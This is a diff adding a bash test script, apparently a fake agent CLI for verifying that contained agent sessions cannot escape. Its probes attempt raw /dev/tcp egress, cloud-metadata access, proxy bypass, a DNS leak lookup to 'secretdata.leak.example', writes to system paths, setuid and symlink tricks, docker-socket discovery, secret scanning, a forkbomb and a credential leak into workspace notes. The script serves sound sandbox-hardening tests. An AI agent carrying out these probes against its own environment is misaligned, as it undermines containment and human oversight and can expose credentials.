@@ -1,0 +1,124 @@
+#!/bin/bash
+# A FAKE agent CLI for the contained-session tests. It never talks to a model. Each subcommand is one probe
+# and prints key=value lines. It is bind-mounted read-only at /opt/cli/fake-cli.
+PROXY_HOST=harness2-proxy
+PROXY_PORT=3128
+
+tcp() { if timeout 4 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; then echo CONNECTED; else echo FAILED; fi; }
+
+# send raw bytes to the proxy and print what comes back (first 600 bytes)
+proxy_raw() {
+  exec 3<>"/dev/tcp/$PROXY_HOST/$PROXY_PORT" 2>/dev/null || { echo "NOPROXY"; return; }
+  printf "$1" >&3
+  timeout "${2:-3}" cat <&3 2>/dev/null | head -c 600 | tr '\r\n' '|~'
+  echo
+}
+connect() { proxy_raw "CONNECT $1:$2 HTTP/1.1\r\nHost: $1:$2\r\n\r\nGET / HTTP/1.1\r\nHost: $1\r\n\r\n"; }
+get() { proxy_raw "GET http://$1:$2/ HTTP/1.1\r\nHost: $1:$2\r\n\r\n"; }
+raw_tcp() { exec 3<>"/dev/tcp/$1/$2" 2>/dev/null || { echo FAILED; return; }; printf "$3" >&3; timeout 2 cat <&3 2>/dev/null | head -c 200; echo; }
+tryw() { if ( : > "$1" ) 2>/dev/null; then echo WROTE; else echo DENIED; fi; }
+tryw_append() { if ( echo x >> "$1" ) 2>/dev/null; then echo WROTE; else echo DENIED; fi; }
+try() { if "$@" >/dev/null 2>&1; then echo ALLOWED; else echo DENIED; fi; }
+
+case "$1" in
+  probe-all)
+    # $2 = the upstream container's IP (on the egress network), $3 = the workspace
+    UP="$2"; WS="$3"
+    echo "uid=$(id -u)"; echo "gid=$(id -g)"
+    echo "capeff=$(grep CapEff /proc/self/status | awk '{print $2}')"
+    echo "capbnd=$(grep CapBnd /proc/self/status | awk '{print $2}')"
+    echo "nnp=$(grep NoNewPrivs /proc/self/status | awk '{print $2}')"
+    echo "rootmount=$(awk '$2=="/"{print $4}' /proc/mounts | cut -d, -f1)"
+    echo "wsmount=$(awk -v w="$WS" '$2==w{print $4}' /proc/mounts | cut -d, -f1)"
+    echo "climount=$(awk '$2=="/opt/cli/fake-cli"{print $4}' /proc/mounts | cut -d, -f1)"
+    echo "tmpmount=$(awk '$2=="/tmp"{print $1" "$4}' /proc/mounts)"
+    echo "homemount=$(awk '$2=="/home/agent"{print $1" "$4}' /proc/mounts)"
+    echo "homeowner=$(stat -c '%u' /home/agent)"
+    echo "mount_list=$(awk '{print $2}' /proc/mounts | grep -v -E '^/(proc|sys|dev)' | sort | tr '\n' ' ')"
+    echo "ifaces=$(tail -n +3 /proc/net/dev | cut -d: -f1 | tr -d ' ' | sort | tr '\n' ' ')"
+    echo "default_route=$(awk 'NR>1 && $2=="00000000"{print $1}' /proc/net/route | tr '\n' ' ')"
+    echo "resolv=$(grep '^nameserver' /etc/resolv.conf | tr '\n' ' ')"
+    for t in 1.1.1.1:443 8.8.8.8:53 93.184.216.34:80 127.0.0.1:11434 127.0.0.1:8100 172.17.0.1:11434 172.17.0.1:8105 10.0.2.2:11434 192.168.127.1:11434 192.168.127.1:445 host.docker.internal:11434 "$UP:9000" "$UP:9001" 169.254.169.254:80 ; do
+      echo "tcp[$t]=$(tcp "${t%:*}" "${t##*:}")"
+    done
+    echo "dns[example.com]=$(getent hosts example.com >/dev/null && echo RESOLVED || echo NORESOLVE)"
+    echo "dns[upstream]=$(getent hosts upstream.harness2.test >/dev/null && echo RESOLVED || echo NORESOLVE)"
+    echo "dns[leak]=$(getent hosts secretdata.leak.example >/dev/null && echo RESOLVED || echo NORESOLVE)"
+    echo "dns[proxy]=$(getent hosts $PROXY_HOST >/dev/null && echo RESOLVED || echo NORESOLVE)"
+    echo "unset_proxy=$(env -u HTTPS_PROXY -u HTTP_PROXY -u https_proxy -u http_proxy bash -c 'exec 3<>/dev/tcp/upstream.harness2.test/9000' 2>&1 | head -c 80 | tr '\n' ' ')"
+    echo "via_proxy_ok=$(connect upstream.harness2.test 9000)"
+    echo "via_proxy_get_ok=$(get upstream.harness2.test 9000)"
+    echo "via_proxy_port=$(connect upstream.harness2.test 9001)"
+    echo "via_proxy_host=$(connect example.com 443)"
+    echo "via_proxy_ip=$(connect 1.1.1.1 443)"
+    echo "via_proxy_meta=$(connect 169.254.169.254 80)"
+    echo "via_proxy_loop=$(connect 127.0.0.1 9000)"
+    echo "via_proxy_upip=$(connect "$UP" 9000)"
+    echo "via_proxy_get_deny=$(get example.com 80)"
+    echo "via_proxy_oct=$(connect 0x7f.1 9000)"
+    echo "write[/etc]=$(tryw /etc/pwned)"; echo "write[/usr]=$(tryw /usr/pwned)"; echo "write[/]=$(tryw /pwned)"
+    echo "write[cli]=$(tryw /opt/cli/pwned)"; echo "write[ws]=$(tryw "$WS/ok")"; echo "write[tmp]=$(tryw /tmp/ok)"
+    echo "write[home]=$(tryw /home/agent/ok)"; echo "write[var]=$(tryw /var/tmp/pwned)"
+    echo "overwrite_cli=$(try bash -c "echo x >> /opt/cli/fake-cli")"
+    echo "exec_tmp=$(cp /bin/true /tmp/t 2>/dev/null && /tmp/t >/dev/null 2>&1 && echo ALLOWED || echo DENIED)"
+    echo "exec_home=$(cp /bin/true /home/agent/t 2>/dev/null && /home/agent/t >/dev/null 2>&1 && echo ALLOWED || echo DENIED)"
+    echo "mount_tmpfs=$(try mount -t tmpfs none /mnt)"
+    echo "unshare=$(try unshare -r true)"
+    echo "chown_root=$(try chown 0:0 "$WS/ok")"
+    echo "sysrq=$(tryw /proc/sysrq-trigger)"; echo "core_pattern=$(tryw /proc/sys/kernel/core_pattern)"
+    echo "cgroup=$(tryw /sys/fs/cgroup/pwned)"; echo "kcore_bytes=$(head -c1 /proc/kcore 2>/dev/null | wc -c)"
+    echo "setuid_ws=$(try bash -c "cp /bin/true $WS/su && chmod u+s $WS/su")"
+    echo "hardlink_cli=$(try ln /opt/cli/fake-cli "$WS/hl")"
+    echo "hardlink_etc=$(try ln /etc/passwd "$WS/hl2")"
+    echo "symlink_ws=$(try ln -s /etc/passwd "$WS/sl")"
+    echo "parent_listing=$(ls "$(dirname "$WS")" | tr '\n' ' ')"
+    echo "traverse=$(cd "$WS/../.." 2>/dev/null && ls | head -c 200 | tr '\n' ' ')"
+    echo "host_home=$(ls /home | tr '\n' ' ')"
+    echo "sockets=$(find / -xdev \( -name 'docker.sock' -o -name '*.sock' \) 2>/dev/null | head -5 | tr '\n' ' ')"
+    echo "dockerdev=$(ls /var/run/docker.sock /run/docker.sock 2>&1 | head -2 | tr '\n' ' ')"
+    echo "env_docker=$(env | grep -c '^DOCKER_')"
+    echo "env_canary=$(env | grep -c -E 'CANARY|SECRET|TOKEN|API_KEY')"
+    echo "env_proxy=$(env | grep -i proxy | sort | tr '\n' ' ')"
+    echo "pidns=$(ls /proc | grep -c '^[0-9]')"
+    echo "pids_max=$(cat /sys/fs/cgroup/pids.max)"; echo "mem_max=$(cat /sys/fs/cgroup/memory.max)"
+    echo "swap_max=$(cat /sys/fs/cgroup/memory.swap.max)"; echo "cpu_max=$(cat /sys/fs/cgroup/cpu.max)"
+    ;;
+  tcp) tcp "$2" "$3" ;;
+  connect) connect "$2" "$3" ;;
+  raw) raw_tcp "$2" "$3" "$4" ;;
+  echo) shift; printf '%s\n' "$@" ;;
+  cat) cat "${@:2}" ;;
+  stdin) cat ;;
+  sleep) echo started; sleep "$2" ;;
+  exit) exit "$2" ;;
+  ansi) printf '\033[2J\033[Hclear\033]0;title\007 \033[31mred\033[0m\n' ;;
+  noisy) head -c "$2" /dev/zero | tr '\0' x ;;
+  forkbomb) for i in $(seq 1 400); do sleep 30 & done 2>&1; echo "reached-end children=$(jobs -p | wc -l)" ;;
+  memhog) python3 -c 'import sys; b = bytearray(int(sys.argv[1]) * 1024 * 1024); print("allocated")' "$2" ;;
+  fsfill) dd if=/dev/zero of="$2/big" bs=1M count="$3" 2>&1 | tail -n 1; echo "rc=${PIPESTATUS[0]}"; ls -l "$2/big" | awk '{print "size="$5}' ;;
+  tmpfill) dd if=/dev/zero of=/tmp/big bs=1M count="$2" 2>&1 | tail -n 1; echo "rc=${PIPESTATUS[0]}" ;;
+  harvest-mess)
+    WS="$2"
+    echo plain > "$WS/plain.md"; mkdir -p "$WS/sub" && chmod 700 "$WS/sub" && echo nested > "$WS/sub/n.md"
+    ln -s /etc/passwd "$WS/escape"; ln -s plain.md "$WS/inner"; mkfifo "$WS/pipe"
+    printf '#!/bin/sh\n' > "$WS/run.sh"; chmod 755 "$WS/run.sh"
+    echo suid > "$WS/su"; chmod 4755 "$WS/su"
+    echo h > "$WS/h1"; ln "$WS/h1" "$WS/h2"
+    head -c 600000 /dev/zero > "$WS/big.md"
+    printf '\033[2Jevil' > "$WS/$(printf 'esc\033name')"
+    echo "done"
+    ;;
+  cred-props)
+    F="$2"; WS="$3"
+    P=$(head -c 12 "$F")
+    echo "readable_prefix=$(head -c 4 "$F")"
+    echo "mount=$(awk -v f="$F" '$2==f{print $4}' /proc/mounts | cut -d, -f1)"
+    echo "append=$(tryw_append "$F")"
+    echo "env_hits=$(env | grep -c -F "$P")"
+    echo "cmdline_hits=$(tr '\0' '\n' < /proc/self/cmdline | grep -c -F "$P")"
+    echo "elsewhere=$(grep -rlsF "$P" /tmp /opt /etc /var /usr/local 2>/dev/null | wc -l)"
+    echo "in_workspace=$(grep -rlsF "$P" "$WS" 2>/dev/null | wc -l)"
+    ;;
+  leak-cred) { echo "my token is:"; cat "$2"; } > "$3/notes.md"; echo "wrote" ;;
+  *) echo "unknown probe $1" >&2; exit 64 ;;
+esac
